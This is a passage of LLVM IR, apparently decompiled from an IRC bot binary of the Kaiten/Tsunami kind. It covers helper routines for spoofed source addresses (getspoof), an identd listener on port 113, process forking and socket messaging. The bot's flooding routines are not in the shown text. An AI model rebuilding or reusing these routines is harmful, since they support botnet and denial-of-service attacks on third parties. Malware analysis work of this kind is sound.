  %v3_10000284 = zext i16 %v2_10000284 to i32
  %v2_10000290 = add i32 %v3_10000284, %stack_var_-16.06
  %v1_1000029c = add i32 %v4_10000280, 2
  %v5_100002a0 = inttoptr i32 %v1_1000029c to i16*
  %v1_100002a8 = add nsw i32 %stack_var_-20.07, -2
  %v2_100002b4 = icmp sgt i32 %v1_100002a8, 1
  br i1 %v2_100002b4, label %dec_label_pc_10000280, label %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge

dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge: ; preds = %dec_label_pc_10000280
  %v3_100002b4.le = icmp eq i32 %v1_100002a8, 1
  br i1 %v3_100002b4.le, label %dec_label_pc_100002c8, label %dec_label_pc_100002f8

dec_label_pc_100002bc:                            ; preds = %entry
  %v3_100002b45 = icmp eq i32 %arg2, 1
  br i1 %v3_100002b45, label %dec_label_pc_100002c8, label %dec_label_pc_100002f8

dec_label_pc_100002c8:                            ; preds = %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge, %dec_label_pc_100002bc
  %stack_var_-24.0.lcssa16 = phi i16* [ %v5_100002a0, %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge ], [ %arg1, %dec_label_pc_100002bc ]
  %stack_var_-16.0.lcssa15 = phi i32 [ %v2_10000290, %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge ], [ 0, %dec_label_pc_100002bc ]
  %v1_100002d8 = bitcast i16* %stack_var_-24.0.lcssa16 to i8*
  %v2_100002d8 = load i8, i8* %v1_100002d8, align 1
  %v3_100002d8 = zext i8 %v2_100002d8 to i32
  %v2_100002f0 = add i32 %v3_100002d8, %stack_var_-16.0.lcssa15
  br label %dec_label_pc_100002f8

dec_label_pc_100002f8:                            ; preds = %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge, %dec_label_pc_100002bc, %dec_label_pc_100002c8
  %stack_var_-16.1 = phi i32 [ %v2_100002f0, %dec_label_pc_100002c8 ], [ 0, %dec_label_pc_100002bc ], [ %v2_10000290, %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge ]
  %v4_100002fc = sdiv i32 %stack_var_-16.1, 65536
  %v1_10000304 = urem i32 %stack_var_-16.1, 65536
  %v2_10000308 = add nsw i32 %v4_100002fc, %v1_10000304
  %v4_10000314 = sdiv i32 %v2_10000308, 65536
  %v2_1000031c = add nsw i32 %v4_10000314, %v2_10000308
  %v2_100003282 = urem i32 %v2_1000031c, 65536
  %v1_10000334 = xor i32 %v2_100003282, 65535
  ret i32 %v1_10000334

; uselistorder directives
  uselistorder i32 %v2_10000308, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0 }
  uselistorder i32 %v1_100002a8, { 0, 2, 1 }
  uselistorder i32 %v2_10000290, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100002f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100002c8, { 1, 0 }
  uselistorder label %dec_label_pc_10000280, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_10000370 = load i8, i8* %arg1, align 1
  %v3_10000380 = icmp eq i8 %v2_10000370, 42
  br i1 %v3_10000380, label %dec_label_pc_100003b8, label %dec_label_pc_10000388

dec_label_pc_10000388:                            ; preds = %entry
  %v3_1000038c = icmp eq i8 %v2_10000370, 63
  br i1 %v3_1000038c, label %dec_label_pc_1000042c, label %dec_label_pc_10000394

dec_label_pc_10000394:                            ; preds = %dec_label_pc_10000388
  %v3_10000398 = icmp eq i8 %v2_10000370, 0
  br i1 %v3_10000398, label %dec_label_pc_100003a4, label %dec_label_pc_10000488

dec_label_pc_100003a4:                            ; preds = %dec_label_pc_10000394
  %v2_100003a8 = load i8, i8* %tmp, align 1
  %v3_100003a8 = zext i8 %v2_100003a8 to i32
  br label %dec_label_pc_1000050c

dec_label_pc_100003b8:                            ; preds = %entry
  %v2_100003bc = add i32 %tmp8, 1
  store i32 268436428, i32* @lr, align 4
  %v5_100003c8 = inttoptr i32 %v2_100003bc to i8*
  %v6_100003c8 = call i32 @strwildmatch(i8* %v5_100003c8, i32 %arg2, i32 %tmp8)
  %v3_100003d0 = icmp eq i32 %v6_100003c8, 0
  br i1 %v3_100003d0, label %dec_label_pc_10000418, label %dec_label_pc_100003d8

dec_label_pc_100003d8:                            ; preds = %dec_label_pc_100003b8
  %v2_100003dc = load i8, i8* %tmp, align 1
  %v3_100003e4 = icmp eq i8 %v2_100003dc, 0
  br i1 %v3_100003e4, label %dec_label_pc_10000420, label %dec_label_pc_100003ec

dec_label_pc_100003ec:                            ; preds = %dec_label_pc_100003d8
  %v2_100003f0 = add i32 %arg2, 1
  store i32 268436480, i32* @lr, align 4
  %v6_100003fc = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_100003f0, i32 %arg2)
  %v3_10000404 = icmp eq i32 %v6_100003fc, 0
  br i1 %v3_10000404, label %dec_label_pc_10000418, label %dec_label_pc_10000420

dec_label_pc_10000418:                            ; preds = %dec_label_pc_100003ec, %dec_label_pc_100003b8
  br label %dec_label_pc_10000420

dec_label_pc_10000420:                            ; preds = %dec_label_pc_100003d8, %dec_label_pc_100003ec, %dec_label_pc_10000418
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10000418 ], [ 1, %dec_label_pc_100003ec ], [ 1, %dec_label_pc_100003d8 ]
  br label %dec_label_pc_1000050c

dec_label_pc_1000042c:                            ; preds = %dec_label_pc_10000388
  %v2_10000430 = load i8, i8* %tmp, align 1
  %v3_10000438 = icmp eq i8 %v2_10000430, 0
  br i1 %v3_10000438, label %dec_label_pc_1000047c, label %dec_label_pc_10000440

dec_label_pc_10000440:                            ; preds = %dec_label_pc_1000042c
  %v1_10000444 = add i32 %tmp8, 1
  %v2_1000044c = add i32 %arg2, 1
  store i32 268436572, i32* @lr, align 4
  %v4_10000458 = inttoptr i32 %v1_10000444 to i8*
  %v5_10000458 = call i32 @strwildmatch(i8* %v4_10000458, i32 %v2_1000044c, i32 %arg2)
  %v3_10000460 = icmp ne i32 %v5_10000458, 0
  %. = zext i1 %v3_10000460 to i32
  br label %dec_label_pc_1000047c

dec_label_pc_1000047c:                            ; preds = %dec_label_pc_10000440, %dec_label_pc_1000042c
  %storemerge2 = phi i32 [ 1, %dec_label_pc_1000042c ], [ %., %dec_label_pc_10000440 ]
  br label %dec_label_pc_1000050c

dec_label_pc_10000488:                            ; preds = %dec_label_pc_10000394
  %v3_1000048c = load i8, i8* %arg1, align 1
  %v4_1000048c = zext i8 %v3_1000048c to i32
  store i32 268436640, i32* @lr, align 4
  %v3_1000049c = call i32 @__GI_toupper(i32 %v4_1000048c, i32 %tmp8)
  %v3_100004a8 = load i8, i8* %tmp, align 1
  %v4_100004a8 = zext i8 %v3_100004a8 to i32
  store i32 268436668, i32* @lr, align 4
  %v3_100004b8 = call i32 @__GI_toupper(i32 %v4_100004a8, i32 %arg2)
  %v4_100004c0 = icmp eq i32 %v3_1000049c, %v3_100004b8
  br i1 %v4_100004c0, label %dec_label_pc_100004c8, label %dec_label_pc_10000504

dec_label_pc_100004c8:                            ; preds = %dec_label_pc_10000488
  %v1_100004cc = add i32 %tmp8, 1
  %v2_100004d4 = add i32 %arg2, 1
  store i32 268436708, i32* @lr, align 4
  %v4_100004e0 = inttoptr i32 %v1_100004cc to i8*
  %v5_100004e0 = call i32 @strwildmatch(i8* %v4_100004e0, i32 %v2_100004d4, i32 %arg2)
  %v3_100004e8 = icmp ne i32 %v5_100004e0, 0
  %.7 = zext i1 %v3_100004e8 to i32
  br label %dec_label_pc_10000504

dec_label_pc_10000504:                            ; preds = %dec_label_pc_100004c8, %dec_label_pc_10000488
  %storemerge = phi i32 [ 1, %dec_label_pc_10000488 ], [ %.7, %dec_label_pc_100004c8 ]
  br label %dec_label_pc_1000050c

dec_label_pc_1000050c:                            ; preds = %dec_label_pc_1000047c, %dec_label_pc_10000420, %dec_label_pc_100003a4, %dec_label_pc_10000504
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_10000420 ], [ %storemerge2, %dec_label_pc_1000047c ], [ %v3_100003a8, %dec_label_pc_100003a4 ], [ %storemerge, %dec_label_pc_10000504 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_1000050c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000420, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000530 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000530, i32* %stack_var_-144, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_100452b4.21 to i32), i32* @r3, align 4
  %v2_100005b4 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436928, i32* @lr, align 4
  %v4_100005bc = call i32 @vsprintf(i32 ptrtoint (i32* @global_var_100452b4.21 to i32), i32 %arg2, i32 %v2_100005b4, i32 268697600)
  store i32 ptrtoint (i32* @global_var_100452b4.21 to i32), i32* @r3, align 4
  %v0_100005c8 = call i32 @__GI_strlen()
  store i32 268436964, i32* @lr, align 4
  %v3_100005e0 = call i32 @write(i32 %arg1, i32 ptrtoint (i32* @global_var_100452b4.21 to i32), i32 %v0_100005c8)
  %v2_100005ec = load i32, i32* %stack_var_-144, align 4
  store i32 %v2_100005ec, i32* @r11, align 4
  %v1_100005f8 = add i32 %v2_100005ec, -4
  %v2_100005f8 = inttoptr i32 %v1_100005f8 to i32*
  %v3_100005f8 = load i32, i32* %v2_100005f8, align 4
  store i32 %v3_100005f8, i32* @r31, align 4
  ret i32 %v3_100005e0

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100452b4.21 to i32), { 1, 2, 0, 3 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10000620 = load i8, i8* @global_var_10045150.22, align 1
  %v3_10000628 = icmp eq i8 %v3_10000620, 1
  br i1 %v3_10000628, label %dec_label_pc_10000630, label %dec_label_pc_1000065c

dec_label_pc_10000630:                            ; preds = %entry
  %v3_10000634 = load i32, i32* @global_var_1004517c.23, align 4
  %v6_1000064c = call i32 @Send(i32 %v3_10000634, i32 ptrtoint ([30 x i8]* @global_var_1002a05c.24 to i32), i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10000760

dec_label_pc_1000065c:                            ; preds = %entry
  store i32 268437088, i32* @lr, align 4
  %v0_1000065c = call i32 @fork()
  %v3_1000066c = icmp eq i32 %v0_1000065c, 0
  br i1 %v3_1000066c, label %dec_label_pc_10000674, label %dec_label_pc_10000680

dec_label_pc_10000674:                            ; preds = %dec_label_pc_1000065c
  br label %dec_label_pc_10000760

dec_label_pc_10000680:                            ; preds = %dec_label_pc_1000065c
  %v3_10000684 = load i32, i32* @global_var_1004515c.26, align 4
  %v1_10000688 = add i32 %v3_10000684, 1
  store i32 %v1_10000688, i32* @global_var_1004515c.26, align 4
  %v1_1000069c = mul i32 %v1_10000688, 4
  %v1_100006a0 = add i32 %v1_1000069c, 4
  store i32 %v1_100006a0, i32* @r3, align 4
  store i32 268437164, i32* @lr, align 4
  %v0_100006a8 = call i32 @malloc()
  %v3_100007042 = load i32, i32* @global_var_1004515c.26, align 4
  %v3_100007104 = icmp eq i32 %v3_100007042, 1
  br i1 %v3_100007104, label %dec_label_pc_10000718, label %dec_label_pc_100006c0

dec_label_pc_100006c0:                            ; preds = %dec_label_pc_10000680, %dec_label_pc_100006c0
  %storemerge16 = phi i32 [ %v1_100006f8, %dec_label_pc_100006c0 ], [ 0, %dec_label_pc_10000680 ]
  %v1_100006c4 = mul i32 %storemerge16, 4
  %v2_100006d0 = add i32 %v1_100006c4, %v0_100006a8
  store i32 %v2_100006d0, i32* @r10, align 4
  %v3_100006e4 = load i32, i32* @global_var_100451ac.27, align 4
  %v2_100006e8 = add i32 %v3_100006e4, %v1_100006c4
  %v1_100006ec = inttoptr i32 %v2_100006e8 to i32*
  %v2_100006ec = load i32, i32* %v1_100006ec, align 4
  %v2_100006f0 = inttoptr i32 %v2_100006d0 to i32*
  store i32 %v2_100006ec, i32* %v2_100006f0, align 4
  %v1_100006f8 = add i32 %storemerge16, 1
  %v3_10000704 = load i32, i32* @global_var_1004515c.26, align 4
  %v1_10000708 = add i32 %v3_10000704, -1
  %v3_10000710 = icmp ugt i32 %v1_10000708, %v1_100006f8
  br i1 %v3_10000710, label %dec_label_pc_100006c0, label %dec_label_pc_10000700.dec_label_pc_10000718_crit_edge

dec_label_pc_10000700.dec_label_pc_10000718_crit_edge: ; preds = %dec_label_pc_100006c0
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000680, %dec_label_pc_10000700.dec_label_pc_10000718_crit_edge
  %v3_1000071c = phi i32 [ %v3_10000704, %dec_label_pc_10000700.dec_label_pc_10000718_crit_edge ], [ %v3_100007042, %dec_label_pc_10000680 ]
  %v1_10000720 = mul i32 %v3_1000071c, 4
  %v2_1000072c = add i32 %v0_100006a8, -4
  %v1_10000730 = add i32 %v2_1000072c, %v1_10000720
  %v2_10000738 = inttoptr i32 %v1_10000730 to i32*
  store i32 %v0_1000065c, i32* %v2_10000738, align 4
  %v3_10000740 = load i32, i32* @global_var_100451ac.27, align 4
  store i32 %v3_10000740, i32* @r3, align 4
  store i32 268437324, i32* @lr, align 4
  %v0_10000748 = call i32 @free()
  store i32 %v0_100006a8, i32* @global_var_100451ac.27, align 4
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000674, %dec_label_pc_10000630, %dec_label_pc_10000718
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_10000630 ], [ 0, %dec_label_pc_10000674 ], [ %v0_1000065c, %dec_label_pc_10000718 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_100006f8, { 1, 0 }
  uselistorder i32 %v1_100006c4, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_100007042, { 1, 0 }
  uselistorder i32 %v0_100006a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10000760, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000718, { 1, 0 }
  uselistorder label %dec_label_pc_100006c0, { 1, 0 }
}

define i32 @getspoof() local_unnamed_addr {
entry:
  %v3_10000798 = load i8*, i8** @global_var_10045154.28, align 4
  %v4_10000798 = ptrtoint i8* %v3_10000798 to i32
  %v3_1000079c = icmp eq i8* %v3_10000798, null
  br i1 %v3_1000079c, label %dec_label_pc_100007a4, label %dec_label_pc_100007b4

dec_label_pc_100007a4:                            ; preds = %entry
  store i32 268437416, i32* @lr, align 4
  %v0_100007a4 = call i32 @random()
  br label %dec_label_pc_10000818

dec_label_pc_100007b4:                            ; preds = %entry
  %v3_100007b8 = load i32, i32* @global_var_10045158.29, align 4
  %v3_100007bc = icmp eq i32 %v3_100007b8, 1
  br i1 %v3_100007bc, label %dec_label_pc_100007c4, label %dec_label_pc_100007dc

dec_label_pc_100007c4:                            ; preds = %dec_label_pc_100007b4
  store i32 %v4_10000798, i32* @r3, align 4
  %v3_100007d0 = call i32 @ntohl(i32 %v4_10000798, i32 268697600)
  br label %dec_label_pc_10000818

dec_label_pc_100007dc:                            ; preds = %dec_label_pc_100007b4
  store i32 268437472, i32* @lr, align 4
  %v0_100007dc = call i32 @random()
  %v3_100007ec = load i32, i32* @global_var_10045158.29, align 4
  %v2_100007f0 = urem i32 %v0_100007dc, %v3_100007ec
  %v3_10000800 = load i8*, i8** @global_var_10045154.28, align 4
  %v4_10000800 = ptrtoint i8* %v3_10000800 to i32
  %v2_10000804 = add i32 %v4_10000800, %v2_100007f0
  %v1_10000808 = add i32 %v2_10000804, 1
  store i32 %v1_10000808, i32* @r3, align 4
  %v2_10000810 = call i32 @ntohl(i32 %v1_10000808, i32 %v2_10000804)
  br label %dec_label_pc_10000818

dec_label_pc_10000818:                            ; preds = %dec_label_pc_100007c4, %dec_label_pc_100007a4, %dec_label_pc_100007dc
  %stack_var_-24.0 = phi i32 [ %v0_100007a4, %dec_label_pc_100007a4 ], [ %v3_100007d0, %dec_label_pc_100007c4 ], [ %v2_10000810, %dec_label_pc_100007dc ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_10000798, { 1, 0 }
  uselistorder i32 (i32, i32)* @ntohl, { 1, 0 }
  uselistorder label %dec_label_pc_10000818, { 2, 0, 1 }
}

define i32 @filter(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000088c = add i32 %arg1, -1
  br label %dec_label_pc_10000878

dec_label_pc_10000854:                            ; preds = %dec_label_pc_100008a4, %dec_label_pc_10000878
  store i32 %arg1, i32* @r3, align 4
  %v0_10000858 = call i32 @__GI_strlen()
  %v1_1000086c = add i32 %v0_10000858, %v2_1000088c
  %v3_10000874 = inttoptr i32 %v1_1000086c to i8*
  store i8 0, i8* %v3_10000874, align 1
  br label %dec_label_pc_10000878

dec_label_pc_10000878:                            ; preds = %entry, %dec_label_pc_10000854
  store i32 %arg1, i32* @r3, align 4
  %v0_1000087c = call i32 @__GI_strlen()
  %v1_10000890 = add i32 %v0_1000087c, %v2_1000088c
  %v1_10000894 = inttoptr i32 %v1_10000890 to i8*
  %v2_10000894 = load i8, i8* %v1_10000894, align 1
  %v3_1000089c = icmp eq i8 %v2_10000894, 13
  br i1 %v3_1000089c, label %dec_label_pc_10000854, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000878
  store i32 %arg1, i32* @r3, align 4
  %v0_100008a8 = call i32 @__GI_strlen()
  %v1_100008bc = add i32 %v0_100008a8, %v2_1000088c
  %v1_100008c0 = inttoptr i32 %v1_100008bc to i8*
  %v2_100008c0 = load i8, i8* %v1_100008c0, align 1
  %v3_100008c8 = icmp eq i8 %v2_100008c0, 10
  br i1 %v3_100008c8, label %dec_label_pc_10000854, label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008a4
  ret i32 %v0_100008a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000878, { 1, 0 }
}

define i32 @randstring(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268437768, i32* @lr, align 4
  %v1_10000904 = call i32 @__GI_time(i32 0)
  store i32 268437780, i32* @lr, align 4
  %v1_10000910 = call i32 @srand(i32 %v1_10000904)
  %v1_1000092c = add i32 %arg1, 1
  store i32 %v1_1000092c, i32* @r3, align 4
  store i32 268437816, i32* @lr, align 4
  %v0_10000934 = call i32 @malloc()
  %v3_10000944 = icmp eq i32 %v0_10000934, 0
  br i1 %v3_10000944, label %dec_label_pc_100009f4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %entry
  %v2_100009cc5 = icmp sgt i32 %arg1, 0
  br i1 %v2_100009cc5, label %dec_label_pc_1000096c, label %dec_label_pc_100009d4

dec_label_pc_1000096c:                            ; preds = %dec_label_pc_10000958, %dec_label_pc_1000096c
  %storemerge38 = phi i32 [ %v1_100009bc, %dec_label_pc_1000096c ], [ 0, %dec_label_pc_10000958 ]
  store i32 268437872, i32* @lr, align 4
  %v0_1000096c = call i32 @random()
  %v2_1000097c = urem i32 %v0_1000096c, 62
  %v2_1000099c = add i32 %storemerge38, %v0_10000934
  %v2_100009a8 = add i32 %v2_1000097c, ptrtoint ([63 x i8]* @global_var_1002a07c.30 to i32)
  %v1_100009ac = inttoptr i32 %v2_100009a8 to i8*
  %v2_100009ac = load i8, i8* %v1_100009ac, align 1
  %v3_100009b4 = inttoptr i32 %v2_1000099c to i8*
  store i8 %v2_100009ac, i8* %v3_100009b4, align 1
  %v1_100009bc = add nuw nsw i32 %storemerge38, 1
  %v2_100009cc = icmp slt i32 %v1_100009bc, %arg1
  br i1 %v2_100009cc, label %dec_label_pc_1000096c, label %dec_label_pc_100009d4

dec_label_pc_100009d4:                            ; preds = %dec_label_pc_1000096c, %dec_label_pc_10000958
  %v2_100009e0 = add i32 %v0_10000934, %arg1
  %v3_100009e8 = inttoptr i32 %v2_100009e0 to i8*
  store i8 0, i8* %v3_100009e8, align 1
  br label %dec_label_pc_100009f4

dec_label_pc_100009f4:                            ; preds = %entry, %dec_label_pc_100009d4
  %storemerge = phi i32 [ %v0_10000934, %dec_label_pc_100009d4 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_100009bc, { 1, 0 }
  uselistorder i32 %storemerge38, { 1, 0 }
  uselistorder i32 %v0_10000934, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100009f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000096c, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  store i32 268438072, i32* @lr, align 4
  %v3_10000a34 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000a48 = icmp eq i32 %v3_10000a34, -1
  br i1 %v4_10000a48, label %dec_label_pc_10000d70, label %dec_label_pc_10000a50

dec_label_pc_10000a50:                            ; preds = %entry
  store i32 113, i32* @r3, align 4
  %v1_10000a5c = call i32 @htons(i32 113)
  store i32 %v3_10000a34, i32* @r3, align 4
  store i32 268438172, i32* @lr, align 4
  %v0_10000a98 = call i32 @bind()
  %v4_10000aa4 = icmp eq i32 %v0_10000a98, -1
  br i1 %v4_10000aa4, label %dec_label_pc_10000d70, label %dec_label_pc_10000aac

dec_label_pc_10000aac:                            ; preds = %dec_label_pc_10000a50
  store i32 268438200, i32* @lr, align 4
  %v3_10000ab4 = call i32 @listen(i32 %v3_10000a34, i32 1, i32 %v0_10000a98)
  %v4_10000ac0 = icmp eq i32 %v3_10000ab4, -1
  br i1 %v4_10000ac0, label %dec_label_pc_10000d70, label %dec_label_pc_10000ac8

dec_label_pc_10000ac8:                            ; preds = %dec_label_pc_10000aac
  store i32 268438220, i32* @lr, align 4
  %v0_10000ac8 = call i32 @fork()
  %v3_10000ad0 = icmp eq i32 %v0_10000ac8, 0
  br i1 %v3_10000ad0, label %dec_label_pc_10000d70, label %dec_label_pc_10000ad8

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000ac8
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000ae0 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000ae4 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438264, i32* @lr, align 4
  %v4_10000af4 = call i32 @accept(i32 %v3_10000a34, i32 %v2_10000ae0, i32 %v2_10000ae4, i32 %v2_10000ae4)
  %v4_10000b08 = icmp eq i32 %v4_10000af4, -1
  br i1 %v4_10000b08, label %dec_label_pc_10000b10, label %dec_label_pc_10000b18.preheader

dec_label_pc_10000b10:                            ; preds = %dec_label_pc_10000ad8
  %v0_10000b14 = call i32 @__GI_exit()
  br label %dec_label_pc_10000b18.preheader

dec_label_pc_10000b18.preheader:                  ; preds = %dec_label_pc_10000b10, %dec_label_pc_10000ad8
  %v2_10000b18 = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000b60 = udiv i32 %v4_10000af4, 32
  %v1_10000b68 = mul nuw nsw i32 %v1_10000b60, 4
  %v2_10000b6c = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000b70 = add i32 %v2_10000b6c, 1092
  %v1_10000b74 = add i32 %v2_10000b70, %v1_10000b68
  %v1_10000b78 = inttoptr i32 %v1_10000b74 to i32*
  %v1_10000b80 = urem i32 %v4_10000af4, 32
  %v3_10000b88 = shl i32 1, %v1_10000b80
  %v1_10000bb8 = add i32 %v4_10000af4, 1
  %v2_10000bc0 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000c14 = sub i32 0, %v4_10000af4
  %v4_10000c14 = urem i32 %v3_10000c14, 32
  %v6_10000c14 = xor i32 %v4_10000c14, 31
  %v12_10000c14 = lshr i32 -1, %v1_10000b80
  %v16_10000c14 = xor i32 %v12_10000c14, 1
  %v14_10000c14 = urem i32 %v12_10000c14, 2
  br label %dec_label_pc_10000b18

dec_label_pc_10000b18:                            ; preds = %dec_label_pc_10000b18.preheader, %dec_label_pc_10000bf0
  store i32 %v2_10000b18, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge

dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge: ; preds = %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge, %dec_label_pc_10000b18
  %v3_10000b30.pre = phi i32 [ %v2_10000b18, %dec_label_pc_10000b18 ], [ %v3_10000b30.pre.pre, %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge ]
  %v1_10000b4830 = phi i32 [ 1, %dec_label_pc_10000b18 ], [ %v1_10000b48, %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge ]
  %v1_10000b34 = mul nuw nsw i32 %v1_10000b4830, 4
  %v2_10000b38 = add i32 %v1_10000b34, %v3_10000b30.pre
  %v2_10000b40 = inttoptr i32 %v2_10000b38 to i32*
  store i32 0, i32* %v2_10000b40, align 4
  %v1_10000b48 = add nuw nsw i32 %v1_10000b4830, 1
  %tmp25 = icmp ult i32 %v1_10000b48, 32
  br i1 %tmp25, label %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge, label %dec_label_pc_10000b5c

dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge: ; preds = %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge
  %v3_10000b30.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge
  %v2_10000b78 = load i32, i32* %v1_10000b78, align 4
  %v2_10000b8c = or i32 %v2_10000b78, %v3_10000b88
  store i32 %v2_10000b8c, i32* %v1_10000b78, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438492, i32* @lr, align 4
  %v5_10000bd8 = call i32 @__libc_select(i32 %v1_10000bb8, i32 %v2_10000b18, i32 0, i32 0, i32 %v2_10000bc0)
  %tmp26 = icmp sgt i32 %v5_10000bd8, -1
  br i1 %tmp26, label %dec_label_pc_10000bf0, label %dec_label_pc_10000be8

dec_label_pc_10000be8:                            ; preds = %dec_label_pc_10000b5c
  %v0_10000bec = call i32 @__GI_exit()
  br label %dec_label_pc_10000bf0

dec_label_pc_10000bf0:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000be8
  %v2_10000c08 = load i32, i32* %v1_10000b78, align 4
  %v5_10000c14 = shl i32 %v2_10000c08, %v4_10000c14
  %v7_10000c14 = lshr i32 %v2_10000c08, %v6_10000c14
  %v8_10000c14 = udiv i32 %v7_10000c14, 2
  %v9_10000c14 = or i32 %v8_10000c14, %v5_10000c14
  %tmp = icmp slt i32 %v2_10000c08, 0
  %v15_10000c142 = zext i1 %tmp to i32
  %v17_10000c14 = and i32 %v15_10000c142, %v16_10000c14
  %v14_10000c14.masked = and i32 %v14_10000c14, %v9_10000c14
  %v1_10000c1c = or i32 %v14_10000c14.masked, %v17_10000c14
  %v3_10000c20 = icmp eq i32 %v1_10000c1c, 0
  br i1 %v3_10000c20, label %dec_label_pc_10000b18, label %dec_label_pc_10000c2c

dec_label_pc_10000c2c:                            ; preds = %dec_label_pc_10000bf0
  %v2_10000c2c = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438596, i32* @lr, align 4
  %v4_10000c40 = call i32 @recv(i32 %v4_10000af4, i32 %v2_10000c2c, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000c40, 1
  br i1 %tmp27, label %dec_label_pc_10000c64, label %dec_label_pc_10000c58

dec_label_pc_10000c58:                            ; preds = %dec_label_pc_10000c2c
  %tmp28 = icmp slt i32 %v4_10000c40, 20
  br i1 %tmp28, label %dec_label_pc_10000c6c, label %dec_label_pc_10000c64

dec_label_pc_10000c64:                            ; preds = %dec_label_pc_10000c58, %dec_label_pc_10000c2c
  %v0_10000c68 = call i32 @__GI_exit()
  br label %dec_label_pc_10000c6c

dec_label_pc_10000c6c:                            ; preds = %dec_label_pc_10000c58, %dec_label_pc_10000c64
